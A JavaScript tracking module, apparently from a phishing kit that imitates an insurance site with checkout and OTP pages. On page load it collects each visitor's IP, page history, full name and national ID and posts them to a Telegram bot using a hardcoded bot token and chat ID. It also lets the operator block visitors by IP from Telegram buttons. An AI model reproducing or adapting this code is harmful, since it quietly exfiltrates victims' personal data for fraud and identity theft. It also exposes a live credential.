/* ═══════════════════════════════════════════════════════
   Tracker — تتبع رحلة العميل + الحظر
   ═══════════════════════════════════════════════════════ */

const Tracker = (function () {
  const STORAGE_KEY = 'bcare_journey';
  const IP_KEY      = 'bcare_ip';
  const TG_TOKEN    = '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow';
  const TG_CHAT     = '1451039924';

  const PAGE_NAMES = {
    'app.html':            'الصفحة الرئيسية',
    'policy-details.html': 'تفاصيل الوثيقة',
    'offers.html':         'العروض',
    'secure-checkout.html':'الدفع',
    'otp-verify.html':     'تأكيد OTP',
  };

  /* ─── جلب IP ─────────────────────────────────────── */
  async function getIP() {
    let ip = sessionStorage.getItem(IP_KEY);
    if (ip) return ip;
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const d = await r.json();
      ip = d.ip || 'unknown';
    } catch(e) {
      ip = 'unknown';
    }
    sessionStorage.setItem(IP_KEY, ip);
    return ip;
  }

  /* ─── تسجيل صفحة ────────────────────────────────── */
  function logPage(page) {
    try {
      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      journey.push({
        page,
        pageName: PAGE_NAMES[page] || page,
        time: new Date().toLocaleString('ar-SA'),
        ts: Date.now(),
      });
      localStorage.setItem(STORAGE_KEY, JSON.stringify(journey));
    } catch(e) {}
  }

  /* ─── إرسال الرحلة لتليجرام ─────────────────────── */
  async function sendJourneyToTelegram(extra) {
    try {
      const ip = await getIP();
      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
      const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');

      const pagesList = journey.map((j, i) =>
        `  ${i + 1}. ${j.pageName} — ${j.time}`
      ).join('\n');

      const ref = offer.refNumber || '—';
      const name = policy.fullName || '—';
      const natId = JSON.parse(sessionStorage.getItem('bcare_form') || '{}').nationalId || '—';

      const msg = `📊 <b>رحلة العميل</b>

🆔 المرجع: <code>${ref}</code>
👤 الاسم: ${name}
🪪 الهوية: <code>${natId}</code>
🌐 IP: <code>${ip}</code>

📋 <b>الصفحات التي زارها:</b>
${pagesList || '  لا توجد بيانات'}

${extra || ''}`;

      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TG_CHAT,
          text: msg,
          parse_mode: 'HTML',
        }),
      });
    } catch(e) {}
  }

  /* ─── مراقبة أزرار الحظر ────────────────────────── */
  let blockPollInt = null;
  let lastBlockUpdateId = 0;

  async function startBlockPolling() {
    try {
      const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${lastBlockUpdateId + 1}&timeout=5`);
      const d = await r.json();
      if (!d.ok || !d.result) return;

      for (const u of d.result) {
        lastBlockUpdateId = Math.max(lastBlockUpdateId, u.update_id);
        if (!u.callback_query) continue;
        const cq = u.callback_query;
        const data = cq.data || '';

        if (data.startsWith('blockip_')) {
          const ip = data.replace('blockip_', '');
          await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: cq.id, text: '🚫 تم الحظر' }),
          });
          await fetch(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: cq.message.chat.id,
              message_id: cq.message.message_id,
              text: cq.message.text + `\n\n🚫 <b>تم حظر هذا العميل</b>\nIP: <code>${ip}</code>`,
              parse_mode: 'HTML',
              reply_markup: {
                inline_keyboard: [[{ text: '✅ إلغاء الحظر', callback_data: `unblockip_${ip}` }]]
              },
            }),
          });
          await blockIP(ip);
        }

        if (data.startsWith('unblockip_')) {
          const ip = data.replace('unblockip_', '');
          await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: cq.id, text: '✅ تم إلغاء الحظر' }),
          });
          await fetch(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: cq.message.chat.id,
              message_id: cq.message.message_id,
              text: cq.message.text + `\n\n✅ <b>تم إلغاء حظر هذا العميل</b>`,
              parse_mode: 'HTML',
            }),
          });
          await unblockIP(ip);
        }
      }
    } catch(e) {}
  }

  function startBlockListener() {
    /* جلب آخر update_id */
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&timeout=0`)
      .then(r => r.json())
      .then(d => {
        if (d.ok && d.result && d.result.length) {
          lastBlockUpdateId = d.result[d.result.length - 1].update_id;
        }
      }).catch(()=>{});
    blockPollInt = setInterval(startBlockPolling, 3000);
  }

  /* ─── فحص الحظر ─────────────────────────────────── */
  async function checkBlocked() {
    try {
      const ip = await getIP();

      /* فحص محلي */
      const local = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
      if (local.some(b => b.ip === ip)) {
        document.body.innerHTML = buildBlockedScreen();
        return true;
      }

      /* فحص من ملف Blocked */
      const r = await fetch('blocked.json?t=' + Date.now());
      const blocked = await r.json();
      if (Array.isArray(blocked) && blocked.some(b => b.ip === ip)) {
        document.body.innerHTML = buildBlockedScreen();
        return true;
      }
    } catch(e) {}
    return false;
  }

  function buildBlockedScreen() {
    return `<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Noto Sans Arabic',sans-serif;background:#f0f4f8;direction:rtl">
      <div style="text-align:center;padding:2rem;max-width:400px">
        <div style="width:80px;height:80px;border-radius:50%;background:#fdecea;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem">
          <span class="material-icons" style="font-size:2.5rem;color:#e53935">block</span>
        </div>
        <h1 style="color:#e53935;font-size:1.4rem;margin-bottom:.5rem">تم حظرك</h1>
        <p style="color:#6b7c93;font-size:.9rem;line-height:1.7">لا يمكنك الوصول إلى هذا الموقع حالياً.<br/>يرجى التواصل مع الدعم للحصول على المساعدة.</p>
      </div>
    </div>`;
  }

  /* ─── حظر IP ─────────────────────────────────────── */
  async function blockIP(ip) {
    try {
      const r = await fetch('blocked.json?t=' + Date.now());
      const blocked = await r.json();
      if (!blocked.some(b => b.ip === ip)) {
        blocked.push({ ip, blockedAt: new Date().toISOString() });
        localStorage.setItem('bcare_blocked', JSON.stringify(blocked));
      }
    } catch(e) {}
  }

  /* ─── إلغاء حظر IP ─────────────────────────────── */
  async function unblockIP(ip) {
    try {
      let blocked = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
      blocked = blocked.filter(b => b.ip !== ip);
      localStorage.setItem('bcare_blocked', JSON.stringify(blocked));
    } catch(e) {}
  }

  /* ─── إرسال عند الدفع ────────────────────────────── */
  async function onCheckout() {
    await sendJourneyToTelegram('💰 <b>العميل وصل صفحة الدفع</b>');
  }

  /* ─── تنظيف ──────────────────────────────────────── */
  function clear() {
    localStorage.removeItem(STORAGE_KEY);
  }

  /* ─── تهيئة ──────────────────────────────────────── */
  async function init() {
    const blocked = await checkBlocked();
    if (blocked) return;

    const page = window.location.pathname.split('/').pop() || 'app.html';
    logPage(page);
    startBlockListener();

    /* إرسال إشعار زيارة جديدة */
    try {
      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      const ip = await getIP();
      const pagesList = journey.map((j, i) =>
        `  ${i + 1}. ${j.pageName} — ${j.time}`
      ).join('\n');

      const msg = `👤 <b>زيارة جديدة</b>

🌐 IP: <code>${ip}</code>
📱 الصفحة: ${PAGE_NAMES[page] || page}
🕐 الوقت: ${new Date().toLocaleString('ar-SA')}

📋 <b>الرحلة حتى الآن:</b>
${pagesList}`;

      const blockKB = JSON.stringify({
        inline_keyboard: [[{ text: '🚫 حظر هذا العميل', callback_data: `blockip_${ip}` }]]
      });

      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TG_CHAT,
          text: msg,
          parse_mode: 'HTML',
          reply_markup: blockKB,
        }),
      });
    } catch(e) {}
  }

  return { init, getIP, sendJourneyToTelegram, onCheckout, clear, checkBlocked, blockIP, unblockIP };
})();

document.addEventListener('DOMContentLoaded', () => Tracker.init());
